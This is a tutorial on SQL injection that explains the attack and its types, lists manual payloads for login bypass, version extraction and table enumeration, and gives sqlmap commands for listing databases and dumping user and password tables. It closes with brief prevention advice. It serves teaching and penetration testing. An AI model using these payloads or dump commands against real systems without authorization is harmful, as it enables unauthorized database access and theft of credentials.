## SQL Injection (SQLi)

## **1. Introduction to SQL Injection**  
SQL Injection (SQLi) is a web security vulnerability that allows an attacker to manipulate SQL queries executed by an application. This can lead to unauthorized access, data leakage, or even full database compromise.  

### **1.1 How SQL Injection Works**  
When a web application does not properly validate or sanitize user inputs, an attacker can inject malicious SQL code into database queries.  

For example, consider the following vulnerable query:  

```sql
SELECT * FROM users WHERE username = '$input_username' AND password = '$input_password';
```  
If a user inputs `admin' --` as the username, the query becomes:  

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '';
```  
The `--` makes the rest of the query a comment, effectively bypassing authentication.

---

## **2. Types of SQL Injection Attacks**  
1. **Error-Based SQL Injection** – Uses database error messages to extract information.  
2. **Union-Based SQL Injection** – Uses the `UNION` SQL operator to combine results from different queries.  
3. **Boolean-Based (Blind) SQL Injection** – Exploits conditional responses (True/False) without error messages.  
4. **Time-Based (Blind) SQL Injection** – Uses SQL commands like `SLEEP()` to determine if a query is vulnerable.  
5. **Out-of-Band SQL Injection** – Uses external channels (e.g., DNS or HTTP requests) to extract data.  

---

## **3. Manually Testing for SQL Injection**  

### **3.1 Identifying Vulnerable Parameters**  
1. Use `'` (single quote) in input fields. If an error occurs, the input is likely vulnerable.  
2. Use common SQL payloads like:  

   ```
   ' OR 1=1 --
   ' UNION SELECT null, version() --
   ```

3. Check for database errors in responses (e.g., `MySQL syntax error` or `Unclosed quotation mark after the character string`).  

### **3.2 Common SQLi Payloads**  
- **Bypassing Login**  
  ```
  admin' --  
  ' OR 1=1 --  
  ' OR '1'='1' --  
  ```

- **Extracting Database Version**  
  ```
  ' UNION SELECT null, @@version --
  ```

- **Enumerating Database Tables (MySQL)**  
  ```
  ' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database() --
  ```

---

## **4. Automating SQL Injection with SQLmap**  
SQLmap is a powerful tool for automating SQL injection testing.

### **4.1 Installing SQLmap**  
On Kali Linux, SQLmap is pre-installed. If not, install it using:  
```bash
sudo apt install sqlmap
```
For other systems:  
```bash
pip install sqlmap
```

### **4.2 Basic SQLmap Usage**  
Run SQLmap against a vulnerable URL:  
```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs
```
This command:  
- Tests `id=1` for SQL injection  
- Lists all available databases  

### **4.3 Extracting Tables & Columns**  
Find tables in a specific database:  
```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
```
Find columns in a table:  
```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns
```

### **4.4 Dumping Data**  
To extract usernames and passwords:  
```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump
```

### **4.5 Bypassing Login with SQLmap**  
```bash
sqlmap -u "http://target.com/login.php" --data="username=admin&password=123" --dump
```
This automates SQL injection in login forms.

---

## **5. Preventing SQL Injection**  

- Use **Prepared Statements (Parameterized Queries)**  
```python
cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
```

- **Input Validation & Whitelisting**  
- **Least Privilege for Database Users**  
- **Web Application Firewalls (WAF)**  
- **Regular Security Audits & Penetration Testing**  
